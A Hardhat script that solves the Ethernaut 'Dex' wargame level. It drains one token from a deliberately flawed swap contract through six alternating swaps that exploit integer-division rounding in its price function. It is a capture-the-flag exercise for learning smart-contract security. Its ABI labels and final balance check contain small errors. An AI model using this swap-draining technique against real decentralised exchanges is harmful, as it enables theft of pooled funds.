import { ethers } from "hardhat";

const attackDex = async () => {
    // change contract addresses here.
    const dexAddress = "0x10929702D8f5E0720596E87d3567874b37848Ee3";
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
    // const token1Address = "0x85aE05EF06fbAFfaA0BE49ECE835c60569E59f22"; //type "await contract.token1()" in ethernaut console
    // const token2Address = "0xf2B9A6A13e103E5b0E028Fd07Cf4d4cf879D3C34"; //type "await contract.token2()" in ethernaut console

    // Don't touch below
    // Vulnerability comes from get_swap_price(). division wont always result in an integer
    // but sometimes a fraction in which does not exist in solidity
    // You may read more on:
    // https://eips.ethereum.org/EIPS/eip-20
    // https://docs.soliditylang.org/en/v0.8.11/types.html#division
    // after swapping several times you'll see that you have more tokens

    // TODO: automate token address getting from contract
    // TODO: fix conslusion below
    // experimental below to get token1 and token2 address
    // const provider = ethers.getDefaultProvider();
    // const token1Address = await provider.getStorageAt(dexAddress, 0);
    // const token2Address = await provider.getStorageAt(dexAddress, 1);
    // console.log(token1Address);
    // console.log(token2Address);
    // const ABI = [
    //     "function token1() public view returns (address);",
    //     "function token2() public view returns (address);",
    // ];
    // const contractAttack = await ethers.getContractAt(ABI, dexAddress);
    // const t1 = await contractAttack.token1();
    // const t2 = await contractAttack.token2();
    // console.log(t1);
    // console.log(t2);

    const ABI = [
        {
            inputs: [
                { internalType: "address", name: "spender", type: "address" },
                { internalType: "uint256", name: "amount", type: "uint256" },
            ],
            name: "approve",
            outputs: [],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [
                { internalType: "address", name: "from", type: "address" },
                { internalType: "address", name: "to", type: "address" },
                { internalType: "uint256", name: "amount", type: "uint256" },
            ],
            name: "swap",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [
                { internalType: "address", name: "token", type: "address" },
                { internalType: "address", name: "account", type: "address" },
            ],
            name: "balanceOf",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "token1",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
        {
            inputs: [],
            name: "token2",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, dexAddress);
    const token1Address = await contract.token1();
    const token2Address = await contract.token2();
    console.log(`Token 1 address is: ${token1Address}`);
    console.log(`Token 2 address is: ${token2Address}`);
    console.log("Checking token 1 and 2 balances...");
    let token1Balance = await contract.balanceOf(token1Address, player);
    let token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);
    console.log("Approving Dex contract to spend 500 tokens...");
    const approve = await contract.approve(dexAddress, 500);
    const approveReceipt = await approve.wait();
    console.log(approveReceipt);
    // sample table below of continous swap
    // DEX       |        player
    // token1 - token2 | token1 - token2
    // ----------------------------------
    //   100     100   |   10      10
    //   110     90    |   0       20
    //   86      110   |   24      0
    //   110     80    |   0       30
    //   69      110   |   41      0
    //   110     45    |   0       65
    //   0       90    |   110     20
    // execution below
    console.log("Doing a series of swap...");
    console.log("swap 1...");
    const swap1 = await contract.swap(token1Address, token2Address, 10);
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);

    console.log("swap 2...");
    const swap2 = await contract.swap(token2Address, token1Address, 20);
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);

    console.log("swap 3...");
    const swap3 = await contract.swap(token1Address, token2Address, 24);
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);

    console.log("swap 4...");
    const swap4 = await contract.swap(token2Address, token1Address, 30);
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);

    console.log("swap 5...");
    const swap5 = await contract.swap(token1Address, token2Address, 41);
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);
    console.log("swap 6...");
    const swap6 = await contract.swap(token2Address, token1Address, 45);
    // conslusion check balance
    token1Balance = await contract.balanceOf(token1Address, player);
    token2Balance = await contract.balanceOf(token2Address, player);
    console.log(`Token 1 balance is: ${token1Balance}`);
    console.log(`Token 2 balance is: ${token2Balance}`);
    if (token1Balance === "0") {
        console.log("Token1 balance is 0, Level passed! submit to ethernaut");
    } else {
        console.log("Token1 balance is not 0, Level failed! review code above");
    }
};

attackDex()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
